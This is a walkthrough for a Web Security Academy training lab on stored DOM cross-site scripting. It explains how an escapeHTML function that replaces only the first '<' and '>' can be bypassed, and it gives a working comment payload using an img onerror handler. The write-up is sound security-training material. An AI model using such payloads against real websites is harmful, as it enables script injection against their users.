# XSS LAB 13 - Stored DOM XSS

## Manual Solution

### 1. Access the Lab.
- Open the Web Security Academy lab environment in your browser.

### 2. Open the Network tab.

### 3. Open a post in the blog.

### 4. Vulnerabilty script.
- Notice the vulnerabilty script named `loadCommentsWithVulnerableEscapeHtml.js` In the Network tab.
- The script has escaperHTML function.
```js
function escapeHTML(html) {
    return html.replace('<', '&lt;').replace('>', '&gt;');
}
```
- Replace method If pattern is a string, only the first occurrence will be replaced. The original string is left unchanged.
- For example:
    - `input:` `<p>example</p> `
    - `Output:` `&lt;p&gt;example</p>`

### 5. Solving the lab.
- Comment: `<><img src=1 onerror=alert(1)>`
- Name: `Anything`
- Email: `Anything@anything.com`
- Website: `https://www.anything.com`


## Automated Solution

### 1. Download the script
### 2. Run the script with the following command:
```sh
python xss_lab_13.py -u <target_url> -p (if you want to use proxy 127.0.0.1:8080)
``` 